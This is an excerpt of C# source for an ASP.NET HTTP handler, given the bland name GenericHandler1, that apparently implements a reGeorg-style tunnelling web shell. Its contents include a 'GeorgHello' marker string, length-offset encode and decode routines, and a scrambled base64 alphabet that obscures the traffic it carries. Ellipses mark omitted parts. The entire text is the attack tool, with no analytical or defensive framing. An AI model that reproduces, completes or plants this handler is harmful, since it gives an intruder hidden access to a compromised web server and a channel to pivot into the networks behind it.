...
public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSessionState {
    ...
    public static Object[] blv_decode(byte[] data) {
        ...
        while ( i < data_len ) {
            ...
            int l = bytesToInt(length) - 612194972;
            byte[] v = new byte[l];
    ...
    public static byte[] blv_encode(Object[] info) {
        ...
        for (int b = 0; b < info.Length; b++) {
            if ( info[b] != null ) {
                ...
                try {
                    byte[] l = intToBytes(v.Length + 612194972);
    ...
    public void ProcessRequest (HttpContext context) {
        ...
        String GeorgHello = "+TpmLsilG8Q1loUGx2MbfybtGbM2QWEKlW4hIIEKPtVTC91DCyf1P60uPjUGOaltOa8hF98ef5MfxWffEo/ze2UcstlIcpU9O94qAnEwIb9uOyVjsyfHxaELe/lBIeCsChVlC/C3PrggLsav";
        
        Object[] info  = new Object[40];
        Object[] rinfo = new Object[40];

        String en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        String de = "RiTrpUjyqVwLPfc+Glse9I3nxCOAQEFSg46Zb/2hzHYuKmXD1k5oa8WtN7Bd0MvJ";
        ...
        if (context.Request.ContentLength != -1) {
            ...
            if (0 == 1 && inputData.Length > 0) {
                requestDataHead = inputData.Substring(0, 0);
                requestDataTail = inputData.Substring(inputData.Length - 0, 0);

                inputData = inputData.Substring(0);
                inputData = inputData.Substring(0, inputData.Length - 0);
            }
